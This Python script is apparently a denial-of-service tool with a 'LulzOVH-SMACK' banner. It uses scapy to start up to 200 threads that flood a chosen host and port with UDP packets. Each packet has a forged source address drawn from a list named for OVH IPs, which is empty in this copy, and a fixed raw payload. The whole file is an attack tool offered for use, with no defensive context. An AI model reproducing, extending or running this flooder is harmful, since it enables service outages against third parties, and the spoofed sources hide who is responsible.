import threading, sys, os, time
from random import randint, choice
from scapy.all import *

ovh_ips = [

]

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:
            ip = IP(src=choice(ovh_ips), dst=host)
            udp = UDP(sport=RandShort(),dport=int(port))
            raw = Raw("\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B")
            send(ip/udp/raw, verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$            /$$$$$$  /$$    /$$ /$$   /$$          /$$$$$$  /$$      /$$  /$$$$$$   /$$$$$$  /$$   /$$
            | $$                | $$           /$$__  $$| $$   | $$| $$  | $$         /$$__  $$| $$$    /$$$ /$$__  $$ /$$__  $$| $$  /$$/
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \ $$| $$   | $$| $$  | $$        | $$  \__/| $$$$  /$$$$| $$  \ $$| $$  \__/| $$ /$$/ 
            | $$      | $$  | $$| $$|____ /$$/| $$  | $$|  $$ / $$/| $$$$$$$$ /$$$$$$|  $$$$$$ | $$ $$/$$ $$| $$$$$$$$| $$      | $$$$$/  
            | $$      | $$  | $$| $$   /$$$$/ | $$  | $$ \  $$ $$/ | $$__  $$|______/ \____  $$| $$  $$$| $$| $$__  $$| $$      | $$  $$  
            | $$      | $$  | $$| $$  /$$__/  | $$  | $$  \  $$$/  | $$  | $$         /$$  \ $$| $$\  $ | $$| $$  | $$| $$    $$| $$\  $$ 
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$|  $$$$$$/   \  $/   | $$  | $$        |  $$$$$$/| $$ \/  | $$| $$  | $$|  $$$$$$/| $$ \  $$
            |________/ \______/ |__/|________/ \______/     \_/    |__/  |__/         \______/ |__/     |__/|__/  |__/ \______/ |__/  \__/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')